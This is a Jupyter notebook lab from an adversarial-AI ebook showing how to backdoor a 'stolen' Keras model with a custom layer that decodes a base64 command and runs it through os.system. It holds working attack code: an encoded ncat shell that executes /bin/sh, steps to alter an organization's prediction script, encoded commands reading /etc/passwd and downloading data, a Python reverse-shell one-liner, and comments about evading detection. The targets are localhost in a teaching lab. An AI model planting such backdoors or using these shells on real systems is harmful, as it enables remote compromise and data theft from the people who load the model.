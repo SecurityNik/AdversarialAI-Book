{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "1bbe28b8",
   "metadata": {},
   "source": [
    "<img style=\"max-width:20em; height:auto;\" src=\"../graphics/A-Little-Book-on-Adversarial-AI-Cover.png\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "90211033",
   "metadata": {},
   "source": [
    "Author: Nik Alleyne   \n",
    "Author Blog: https://www.securitynik.com   \n",
    "Author GitHub: github.com/securitynik   \n",
    "\n",
    "Author Other Books: [   \n",
    "\n",
    "            \"https://www.amazon.ca/Learning-Practicing-Leveraging-Practical-Detection/dp/1731254458/\",   \n",
    "            \n",
    "            \"https://www.amazon.ca/Learning-Practicing-Mastering-Network-Forensics/dp/1775383024/\"   \n",
    "        ]   \n",
    "\n",
    "\n",
    "This notebook ***(attacking_tf_custom_layers.ipynb)*** is part of the series of notebooks From ***A Little Book on Adversarial AI***  A free ebook released by Nik Alleyne"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "83676234",
   "metadata": {},
   "source": [
    "## Attacking Tensorflow and Keras Custom Layers\n",
    "\n",
    "- We start here from the previous lab, using the model created. Ensure you completed the previous lab, prior to start this one. If you have not, revisit the notebook **attacking_lambda_layers.ipynb**   "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "50f4580e",
   "metadata": {},
   "source": [
    "### Lab Objectives:    \n",
    "- Learn about custom layers   \n",
    "- Leverage the previous model to use custom layers \n",
    "- Expand our knowledge on compromising Keras models  \n",
    "\n",
    "\n",
    "### Step 1:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "afd3b2f2",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import the needed libraries\n",
    "import tensorflow as tf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "4024b41f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[-] Disabling the GPU\n",
      "[*] Current logical devices: [LogicalDevice(name='/device:CPU:0', device_type='CPU')]\n",
      "[*] Current physical devices: [PhysicalDevice(name='/physical_device:GPU:0', device_type='GPU')]\n"
     ]
    }
   ],
   "source": [
    "# On my system, there is a compatibility issue between my Cuda and Tensorflow\n",
    "# As a result I disable the GPU by default for Tensorflow.\n",
    "# If Tensorflow is working fine on your system, then feel free to comment out the lines below\n",
    "\n",
    "# Comment out this line if your GPU works fine in Tensorflow \n",
    "print(f'[-] Disabling the GPU')\n",
    "tf.config.set_visible_devices(devices=[], device_type='GPU')\n",
    "\n",
    "print(f'[*] Current logical devices: {tf.config.list_logical_devices()}')\n",
    "print(f'[*] Current physical devices: {tf.config.list_physical_devices(device_type='GPU')}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "c9ae330f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Tensorflow version used:  2.19.0\n"
     ]
    }
   ],
   "source": [
    "### Version of key libraries used  \n",
    "print(f'Tensorflow version used:  {tf.__version__}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "49c2ea2e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"simple_model\"</span>\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1mModel: \"simple_model\"\u001b[0m\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
       "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
       "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
       "│ first_hidden (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)            │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">32</span>)             │           <span style=\"color: #00af00; text-decoration-color: #00af00\">256</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ second_hidden (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)           │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">64</span>)             │         <span style=\"color: #00af00; text-decoration-color: #00af00\">2,112</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ output (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                  │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │            <span style=\"color: #00af00; text-decoration-color: #00af00\">65</span> │\n",
       "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
       "</pre>\n"
      ],
      "text/plain": [
       "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
       "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
       "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
       "│ first_hidden (\u001b[38;5;33mDense\u001b[0m)            │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m32\u001b[0m)             │           \u001b[38;5;34m256\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ second_hidden (\u001b[38;5;33mDense\u001b[0m)           │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m64\u001b[0m)             │         \u001b[38;5;34m2,112\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ output (\u001b[38;5;33mDense\u001b[0m)                  │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │            \u001b[38;5;34m65\u001b[0m │\n",
       "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">7,301</span> (28.52 KB)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m7,301\u001b[0m (28.52 KB)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">2,433</span> (9.50 KB)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m2,433\u001b[0m (9.50 KB)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Optimizer params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">4,868</span> (19.02 KB)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Optimizer params: \u001b[0m\u001b[38;5;34m4,868\u001b[0m (19.02 KB)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Load the model that we will be compromising\n",
    "# Remember, this would be a stolen model\n",
    "# Simply reusing the model from the last lab : Attacking_Lambda_Layers.ipynb \n",
    "stolen_model = tf.keras.models.load_model(filepath='/tmp/zeek_model.keras')\n",
    "stolen_model.summary()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ce6fdf4c",
   "metadata": {},
   "source": [
    "Whereas in Lambda we setup a custom function to use with the Lambda layer, in this case, we setup a custom layer called MyCustomLayer. This layer is a subclass of the *keras.layers.layer*.   \n",
    "\n",
    "### Step 2: "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "a356cdf7",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Clear any custom objects that might have already been registered\n",
    "tf.keras.utils.get_custom_objects().clear()\n",
    "\n",
    "# We will need to register this object\n",
    "# However, for now, let's assume we did not do this\n",
    "#@tf.keras.utils.register_keras_serializable(package='malicious_custom_layer', name='malicious_custom_layer')\n",
    "\n",
    "class MyCustomLayer(tf.keras.layers.Layer):\n",
    "    # We will add a command parameter to the layer to take the input\n",
    "    # The command parameter represents our custom commands we would like the model to execute\n",
    "    # To make this more interesting, we should provide our commands as base64 encoded strings\n",
    "    # This should make it a bit harder to detect\n",
    "    # Here is the default command we will use\n",
    "    # --ssl ensures this communication is also encrypted\n",
    "    # ncat --verbose --listen 127.0.0.1 --source-port 9999 --keep-open --ssl \n",
    "    # This will be base64 encoded\n",
    "    # Also ensure your listener is setup: \n",
    "    # $ ncat --verbose 127.0.0.1 9999 --exec /bin/sh --ssl &\n",
    "    # bmNhdCAtLXZlcmJvc2UgMTI3LjAuMC4xIDk5OTkgLS1leGVjIC9iaW4vc2ggLS1zc2wgJg==\n",
    "    def __init__(self, command=\"bmNhdCAtLXZlcmJvc2UgMTI3LjAuMC4xIDk5OTkgLS1leGVjIC9iaW4vc2ggLS1zc2wgJg==\", **kwargs):\n",
    "        super().__init__()\n",
    "        self.command = command\n",
    "\n",
    "    def call(self, x):\n",
    "        # This is our malicious code being implemented\n",
    "        import base64\n",
    "        import os\n",
    "        os.system(command=base64.b64decode(s=self.command).decode('utf-8'))\n",
    "\n",
    "        # We return x without modifying it because we want the results to be the same\n",
    "        # Reduce the chances of detection\n",
    "        return x \n",
    "    \n",
    "    def get_config(self):\n",
    "        return {'command' : self.command}"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9a3b1d8c",
   "metadata": {},
   "source": [
    "Remember to setup your ncat session $ **ncat --verbose --listen 9999 --ssl**   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "3735ba26",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Ncat: Version 7.94SVN ( https://nmap.org/ncat )\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"simple_model\"</span>\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1mModel: \"simple_model\"\u001b[0m\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
       "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
       "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
       "│ first_hidden (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)            │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">32</span>)             │           <span style=\"color: #00af00; text-decoration-color: #00af00\">256</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ second_hidden (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)           │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">64</span>)             │         <span style=\"color: #00af00; text-decoration-color: #00af00\">2,112</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ output (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                  │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │            <span style=\"color: #00af00; text-decoration-color: #00af00\">65</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ my_custom_layer_1               │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │             <span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> │\n",
       "│ (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">MyCustomLayer</span>)                 │                        │               │\n",
       "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
       "</pre>\n"
      ],
      "text/plain": [
       "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
       "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
       "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
       "│ first_hidden (\u001b[38;5;33mDense\u001b[0m)            │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m32\u001b[0m)             │           \u001b[38;5;34m256\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ second_hidden (\u001b[38;5;33mDense\u001b[0m)           │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m64\u001b[0m)             │         \u001b[38;5;34m2,112\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ output (\u001b[38;5;33mDense\u001b[0m)                  │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │            \u001b[38;5;34m65\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ my_custom_layer_1               │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │             \u001b[38;5;34m0\u001b[0m │\n",
       "│ (\u001b[38;5;33mMyCustomLayer\u001b[0m)                 │                        │               │\n",
       "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">7,301</span> (28.52 KB)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m7,301\u001b[0m (28.52 KB)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">2,433</span> (9.50 KB)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m2,433\u001b[0m (9.50 KB)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Optimizer params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">4,868</span> (19.02 KB)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Optimizer params: \u001b[0m\u001b[38;5;34m4,868\u001b[0m (19.02 KB)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Add the custom layer to the stolen model\n",
    "stolen_model.add(MyCustomLayer())\n",
    "\n",
    "# Get the model summary\n",
    "stolen_model.summary()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bfbf8704",
   "metadata": {},
   "source": [
    "With the information shown above, you should now be able interact with the compromised host via your *ncat* session. \n",
    "\n",
    "To confirm this worked, go back to your ncat session and you should see that a connection was made.   \n",
    "\n",
    "At this point, with the custom layer added to the model, we can go ahead and rewrite the model to the file system and overwrite the existing model name.   \n",
    "\n",
    "For the purpose of this lab, we are creating a new file, just so we have the original copy and the modified file.   \n",
    "You might also conclude since we were able to see the connection information above, then we are good to go, if we tried to run this from a script.   \n",
    "\n",
    "\n",
    "Let save the model and test if this works.   \n",
    "\n",
    "\n",
    "### Step 3:   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dd29054f",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Ncat: Subject: CN=localhost\n",
      "Ncat: Issuer: CN=localhost\n",
      "Ncat: SHA-1 fingerprint: CD8F C079 7523 F3A7 FE61 F95C 9B78 0A97 D838 7E6D\n",
      "Ncat: Certificate verification failed (self-signed certificate).\n",
      "Ncat: SSL connection to 127.0.0.1:9999.\n",
      "Ncat: SHA-1 fingerprint: CD8F C079 7523 F3A7 FE61 F95C 9B78 0A97 D838 7E6D\n"
     ]
    }
   ],
   "source": [
    "# Save the compromised file back to the file system\n",
    "tf.keras.models.save_model(model=stolen_model, filepath='/tmp/zeek_pwnd_model_custom_layer.keras', overwrite=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e68b6b19",
   "metadata": {},
   "source": [
    "Great! We now have the model back in production. Remember, we need to modify the organization's prediction script, so whenever it loads the model, our default command runs. \n",
    "\n",
    "**Note: open a command prompt**       \n",
    "In the command prompt, ensure you are in the *labs* folder.   \n",
    "Load up the default prediction script : *tf_make_predictions_base_script.py*  and try to make a prediction on your new stolen model:    \n",
    "\n",
    "$ **python3 ./tf_make_predictions_base_script.py --model /tmp/zeek_pwnd_model_custom_layer.keras --data '[[0.5, 0.2, 0.1, 0.3, 0.0001, 0.00001, 0.0001]]'**\n",
    "\n",
    ". It is surely to throw an error similar to what you saw before.   \n",
    "*Exception encountered: Could not locate class 'MyCustomLayer'. Make sure custom classes are decorated with `@keras.saving.register_keras_serializable()`. Full object config: {'module': None, 'class_name': 'MyCustomLayer', 'config': {'command': 'bmNhdCAtLXZlcmJvc2UgMTI3LjAuMC4xIDk5OTkgLS1leGVjIC9iaW4vc2ggLS1zc2wgJg=='}, 'registered_name': 'MyCustomLayer', 'build_config': {'input_shape': [None, 1]}}*\n",
    "\n",
    "We see above the information about *@keras.saving.register_keras_serializable()*. This means we have to register this object.  \n",
    "\n",
    "Similarly, like we learned before, let's add the custom layer into the prediction file. We will also register the object there.   \n",
    "\n",
    "**Note: This is done. If you choose to do it, give the new file a different name**   \n",
    "- First, save the *tf_make_predictions_base_script.py* as *tf_make_predictions_custom_layer_script.py*      \n",
    "- **cp tf_make_predictions_base_script.py tf_make_predictions_custom_layer_script.py -v**  \n",
    "\n",
    "Copy and paste the content below directly after line 15 -> cmd_args = parser.parse_args().    \n",
    "**Note this file already exists**. However, if you do decided to copy and paste, ensure you create a new copy of the original base prediction file.    \n",
    "\n",
    "-------------------------------\n",
    "\n",
    "tf.keras.utils.get_custom_objects().clear()    \n",
    "\n",
    "@tf.keras.utils.register_keras_serializable(package='malicious_custom_layer',  name='malicious_custom_layer')    \n",
    "class MyCustomLayer(tf.keras.layers.Layer):   \n",
    "    def __init__(self, command=\"bmNhdCAtLXZlcmJvc2UgMTI3LjAuMC4xIDk5OTkgLS1leGVjIC9iaW4vc2ggLS1zc2wgJg==\", **kwargs):   \n",
    "        super().__init__()   \n",
    "        self.command = command   \n",
    "\n",
    "    def call(self, x):   \n",
    "        # This is our malicious code being implemented   \n",
    "        import base64   \n",
    "        import os   \n",
    "        os.system(command=base64.b64decode(s=self.command).decode('utf-8'))   \n",
    "\n",
    "        # We return x without modifying it because we want the results to be the same    \n",
    "        # Reduce the chances of detection    \n",
    "        return x    \n",
    "    \n",
    "    def get_config(self):   \n",
    "        return {'command' : self.command}    \n",
    "\n",
    "    -----------------------       \n",
    "\n",
    "After the line with **loaded_model = tf.keras.models.load_model(filepath=cmd_args.model)* which loads the model, then add the custom layer  **loaded_model.add(MyCustomLayer())**    \n",
    "\n",
    "**Save the file load the model:**      \n",
    "We could go back to the top and re-run the code. However, let's use a\\our python file    **tf_rebuild_model_custom_layer.py** created for this purpose:        \n",
    "-  **$ python ./tf_rebuild_model_custom_layer.py --model /tmp/zeek_model.keras  --path /tmp/test.keras --command \"bmNhdCAtLXZlcmJvc2UgMTI3LjAuMC4xIDk5OTkgLS1leGVjIC9iaW4vc2ggLS1zc2wgJg==\"   \n",
    "\n",
    "Remember to ensure your listener is setup  \n",
    "$ *ncat --verbose --listen 127.0.0.1 --source-port 9999 --keep-open --ssl*     \n",
    "\n",
    "**Then run the code to load the model and make a prediction using the path you specified for storing the file**  \n",
    "$ **python tf_make_predictions_custom_layer_script.py --model /tmp/test.keras --data '[[0.5, 0.2, 0.1, 0.3, 0.8, 0.6, 0.3]]'**\n",
    "\n",
    "\n",
    "This should result in a connection coming into your listener, giving you access to the remote host.   \n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "46e3411f",
   "metadata": {},
   "source": [
    "### Our script to do what we want    \n",
    "- By adding the **--command** argument, we make it the attack more interesting, as now we can put any command we wish in the model.   \n",
    "\n",
    "When we modified the organization's prediction script, we specified the default action which is to get us the shell. Just in case someone finds our activity there, let's add a second mechanism via a vile that allows us to run any commands we want.   \n",
    "\n",
    "However, this script will have to rebuild the model to inject the malicious code and get the command executed. \n",
    "\n",
    "Sample file name: **tf_rebuild_model_custom_layer.py**   \n",
    "\n",
    "In order to do this, we need to rebuild the pwnd model from a different perspective.\n",
    "\n",
    "Let's write this as a python code in a separate python file. Open the file **tf_rebuild_model_custom_layer.py**  \n",
    "\n",
    "We will use CyberChef: https://cyberchef.org to help us encode some values we will pass to the command line. Ensure these values are within quotes\n",
    "\n",
    "Get the current user information\n",
    "**id** -> **aWQ=**  \n",
    "\n",
    "Read the /etc/passwd file  \n",
    "**cat /etc/passwd** -> **Y2F0IC9ldGMvcGFzc3dk**\n",
    "\n",
    "Download a file from a remote location via curl  \n",
    "First start up a simple python http server:  \n",
    "    $ **python -m http.server 3000**\n",
    "\n",
    "curl http://127.0.0.1:3000/sensitive_data.tgz --user-agent 'SecurityNik' --output stolen_data.tgz -> Y3VybCBodHRwOi8vMTI3LjAuMC4xOjMwMDAvc2Vuc2l0aXZlX2RhdGEudGd6IC0tdXNlci1hZ2VudCAnU2VjdXJpdHlOaWsnIC0tb3V0cHV0IHN0b2xlbl9kYXRhLnRneg==\n",
    "\n",
    "Wrap this section up by using a python command. This setups a backdoor:     \n",
    "Remember to setup your listener: ncat --verbose --listen 9999     \n",
    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &\n",
    "    -> cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTI3LjAuMC4xIiw5OTk5KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsnICY=\n",
    "\n",
    "\n",
    "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n",
    "\n",
    "\n",
    "You can now re-run the rebuild script with any of these, leveraging the command parameter:   \n",
    "-  $ **python ./tf_rebuild_model_custom_layer.py --model /tmp/zeek_model.keras --path /tmp/test_model.keras --command aWQ=**        \n",
    "-  $ **python ./tf_rebuild_model_custom_layer.py --model /tmp/zeek_model.keras --path /tmp/test_model.keras --command Y2F0IC9ldGMvcGFzc3dk**   \n",
    "-  $ **./tf_rebuild_model_custom_layer.py --model /tmp/zeek_model.keras --path /tmp/test_model.keras --command Y3VybCBodHRwOi8vMTI3LjAuMC4xOjMwMDAvc2Vuc2l0aXZlX2RhdGEudGd6IC0tdXNlci1hZ2VudCAnU2VjdXJpdHlOaWsnIC0tb3V0cHV0IHN0b2xlbl9kYXRhLnRneg==**   \n",
    "-  $ **python ./tf_rebuild_model_custom_layer.py --model /tmp/zeek_model.keras --path /tmp/test_model.keras --command cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTI3LjAuMC4xIiw5OTk5KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsnICY=**   \n",
    "-  "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bf29b846",
   "metadata": {},
   "source": [
    "!That is it for Attacking Tensorflow Custom Layers   \n",
    "### Takeaways:   \n",
    "- Working with Tensorflow Custom layers   \n",
    "- Setup backdoors via the custom layers   \n",
    "- Leveraging Base64 to encode contents to make it a bit difficult to detect   \n",
    "- Leverage the python argparser to use command line arguments   \n",
    "- Leverage command line arguments to access any information needed from the compromised  system    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d4815c9c",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "067d3ed8",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "adversarial_ai",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
